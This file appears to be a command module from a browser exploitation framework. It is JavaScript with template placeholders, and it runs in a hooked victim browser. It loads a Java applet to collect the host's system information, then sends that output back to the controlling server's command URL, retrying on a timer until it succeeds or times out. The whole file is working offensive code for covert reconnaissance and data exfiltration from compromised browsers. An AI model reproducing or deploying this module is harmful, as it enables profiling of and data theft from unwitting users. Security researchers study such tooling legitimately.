//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

  var internal_counter = 0;
  var timeout = 30;
  var output;

  server.debug('[Get System Info (Java)] Loading getSystemInfo applet...');
  server.dom.attachApplet('getSystemInfo', 'getSystemInfo', 'getSystemInfo', server.net.httpproto+"://"+server.net.host+":"+server.net.port+"/", null, null);

  function waituntilok() {
    server.debug('[Get System Info (Java)] Executing getSystemInfo applet...');

    try {
      output = document.getSystemInfo.getInfo();
      if (output) {
        server.debug('[Get System Info (Java)] Retrieved system info: ' + output);
         server.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"), server.are.status_success());
        server.dom.detachApplet('getSystemInfo');
        return;
      }
    } catch (e) {
      internal_counter = internal_counter + 5;
      if (internal_counter > timeout) {
        server.debug('[Get System Info (Java)] Timeout after ' + timeout + ' seconds');
        server.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after ' + timeout + ' seconds', server.are.status_error());
        server.dom.detachApplet('getSystemInfo');
        return;
      }
      setTimeout(function() {waituntilok()}, 5000);
    }
  }

  setTimeout(function() {waituntilok()}, 5000);
});

